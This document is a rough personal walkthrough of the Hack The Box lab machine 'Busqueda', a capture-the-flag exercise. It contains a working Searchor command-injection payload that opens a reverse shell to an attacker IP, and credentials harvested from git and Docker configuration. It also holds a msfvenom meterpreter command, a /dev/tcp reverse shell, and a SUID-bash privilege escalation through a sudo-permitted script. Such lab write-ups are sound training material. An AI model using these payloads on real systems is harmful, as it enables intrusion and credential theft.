#Busqueda

IP: 10.129.215.11
Release date: 08 Apr, 2023
Completion date: 16 Oct, 2024
## Enumeration

```
sudo nmap -sV -sC -sT -O -p- $IP
```
```
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4f:e3:a6:67:a2:27:f9:11:8d:c3:0e:d7:73:a0:2c:28 (ECDSA)
|_  256 81:6e:78:76:6b:8a:ea:7d:1b:ab:d4:36:b7:f8:ec:c4 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://searcher.htb/
```

# Foothold

CVE-2023-43364
https://github.com/nexis-nexis/Searchor-2.4.0-POC-Exploit-?tab=readme-ov-file

```
engine=Google&query=whoami', exec("import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.10.15.64',1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);"))#
```

## Enumeration
target user: root

netstat -antp
localhost ports 3306 3000 5000 33759 222 45350

3000 gitea.searcher.htb
5000 another instance of searcher.htb


ls -lah /var/www/app/.git
cat /var/www/app/.git/config

```
[core]
	repositoryformatversion = 0
	filemode = true
	bare = false
	logallrefupdates = true
[remote "origin"]
	url = http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git
	fetch = +refs/heads/*:refs/remotes/origin/*
[branch "main"]
	remote = origin
	merge = refs/heads/main
```
	
confirmed:
svc:jh1usoih2bkjaspwe92	

# Finding Priv Esc

```
svc@busqueda:~$ sudo -l
[sudo] password for svc: 
Matching Defaults entries for svc on busqueda:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User svc may run the following commands on busqueda:
    (root) /usr/bin/python3 /opt/scripts/system-checkup.py *
```

```
svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py *
Usage: /opt/scripts/system-checkup.py <action> (arg1) (arg2)

     docker-ps     : List running docker containers
     docker-inspect : Inpect a certain docker container
     full-checkup  : Run a full system checkup
```

for i in $(find / -name *.ini 2>/dev/null | grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#";done

```
echo 'import pty; pty.spawn("/bin/bash")' > shell.py
echo $PATH
/home/svc/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
export PATH="/tmp:$PATH"
```

## Linpeas

/home/svc/.local/bin
docker0 182.17.0.1
172.18.0.1
172.19.0.1
172.20.0.1
/usr/bin/write.ul
/home/svc/snap/lxd/common/config/config.yml

/opt/containerd

/var/lib/command-not-found/commands.db


 echo "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.15.64\",31337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);" > shell.py
 
 
 
msfvenom -p linux/x64/meterpreter_reverse_tcp lhost=10.10.15.64 lport=1337 -f elf > s
 
portfwd add -l 3000 -p 3000 -r localhost
 
 
 ----

 ### format with jq
 ```
 sudo python3 /opt/scripts/system-checkup.py docker-inspect '{{json .}}' gitea | jq .
 ```
 
 sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect '{{json .}}' gitea
 sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect '{{json .}}' mysql_db
 "Env":["MYSQL_ROOT_PASSWORD=jI86kGUuj87guWr3RyF","MYSQL_USER=gitea","MYSQL_PASSWORD=yuiu1hoiu4i5ho1uh","MYSQL_DATABASE=gitea"
 
 gitea password reuse
 administrator:yuiu1hoiu4i5ho1uh
 
# this is most of it. not sure why its not working ;< 
echo -e '!#/bin/sh bash' > full-checkup.sh
chmod +x full-checkup.sh
sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
jh1usoih2bkjaspwe92

# Priv Esc

## create the exploit
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchmod 4777 /tmp/0xdf' > full-checkup.sh
chmod +x full-checkup.sh

### this works too
echo -e '#!/bin/bash\n sh -i >& /dev/tcp/10.10.15.64/9001 0>&1' > full-checkup.sh
the important piece is the \n to create a new line...

## run the exploit
sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup

## cd to the directory and run script with -p to not drop permissions.
cd /tmp
./0xdf -p





